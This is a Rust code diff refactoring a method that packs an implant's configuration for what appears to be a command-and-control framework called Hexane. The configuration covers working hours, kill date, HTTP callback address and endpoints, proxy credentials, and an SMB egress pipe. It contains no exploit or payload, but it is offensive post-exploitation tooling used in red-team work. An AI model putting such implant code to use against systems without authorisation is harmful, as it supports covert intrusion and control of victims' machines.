@@ -288,33 +288,34 @@ impl Hexane {
         stream.pack_int32(working_hours);
         stream.pack_dword64(kill_date);
 
-        let Some(options) = self.network.as_mut();
-        match options {
+        if let Some(options) = self.network.as_mut() {
+            match options {
 
-            NetworkOptions::Http(ref http) => {
-                stream.pack_wstring(http.useragent.as_ref().unwrap().as_str());
-                stream.pack_wstring(&http.address);
-                stream.pack_dword(http.port as u32);
-                stream.pack_dword(http.endpoints.len() as u32);
+                NetworkOptions::Http(ref http) => {
+                    stream.pack_wstring(http.useragent.as_ref().unwrap().as_str());
+                    stream.pack_wstring(&http.address);
+                    stream.pack_dword(http.port as u32);
+                    stream.pack_dword(http.endpoints.len() as u32);
 
-                for endpoint in &http.endpoints {
-                    stream.pack_wstring(endpoint);
+                    for endpoint in &http.endpoints {
+                        stream.pack_wstring(endpoint);
+                    }
+
+                    stream.pack_string(http.domain.as_ref().unwrap().as_str());
+
+                    if let Some(ref proxy) = http.proxy { // todo: proxy should not be exclusive to http (socks5, ftp, etc...)
+                        let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
+                        stream.pack_dword(1);
+                        stream.pack_wstring(&proxy_url);
+                        stream.pack_wstring(proxy.username.as_ref().unwrap().as_str());
+                        stream.pack_wstring(proxy.password.as_ref().unwrap().as_str());
+                    } else {
+                        stream.pack_dword(0);
+                    }
                 }
-
-                stream.pack_string(http.domain.as_ref().unwrap().as_str());
-
-                if let Some(ref proxy) = http.proxy {
-                    let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
-                    stream.pack_dword(1);
-                    stream.pack_wstring(&proxy_url);
-                    stream.pack_wstring(proxy.username.as_ref().unwrap().as_str());
-                    stream.pack_wstring(proxy.password.as_ref().unwrap().as_str());
-                } else {
-                    stream.pack_dword(0);
+                NetworkOptions::Smb(ref smb) => {
+                    stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
                 }
-            }
-            NetworkOptions::Smb(ref smb) => {
-                stream.pack_wstring(smb.egress_pipe.as_ref().unwrap().as_str());
             }
         }
 
